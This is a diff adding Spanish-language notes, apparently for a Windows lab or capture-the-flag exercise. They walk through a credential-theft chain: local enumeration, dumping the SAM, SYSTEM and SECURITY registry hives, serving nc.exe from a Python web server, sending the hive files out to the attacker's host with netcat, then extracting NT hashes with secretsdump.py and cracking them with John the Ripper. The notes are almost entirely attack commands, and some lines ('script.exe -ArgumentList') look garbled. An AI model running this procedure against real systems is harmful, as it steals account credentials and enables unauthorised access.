@@ -1,0 +1,30 @@
+Root.txt
+whoami /all or net user username
+net localgroup group
+...
+
+//reg save HKLM\SECURITY c:\path\security.save
+//reg save HKLM\SYSTEM c:\path\system.save
+//reg save HKLM\SAM c:\path\sam.save
+
+C:\Windows\System32\script.exe -ArgumentList 'save HKLM\SECURITY security.save'
+C:\Windows\System32\script.exe -ArgumentList 'save HKLM\SYSTEM system.save'
+C:\Windows\System32\script.exe -ArgumentList 'save HKLM\SAM sam.save'
+
+(Explicar que son 3 comandos, el -w 120,SeBackupPrivilege, ...)
+Guardar en host:
+    1.- Añadimos nc.exe:
+        python3 -m http.server
+        Descargamos en windows. Poner en buscador: 192.168.56.1:8000 y descargar
+    2.- En host: nc -lvp PORT > sam.save/security.save/system.save
+        En windows: 
+            Abrir cmd:  runas /user:username cmd y poner contraseña anterior
+                        nc -w 120 IP PORT < sam.save/security.save/system.save
+
+secretsdump.py -sam sam.save -system system.save -security security.save LOCAL > result.txt
+//john --format=NT --show hash
+john --rules --stdout --wordlist=pass.txt > pass2.txt
+john --format=NT --wordlist=pass2.txt hash
+john --format=NT --show result.txt
+
+
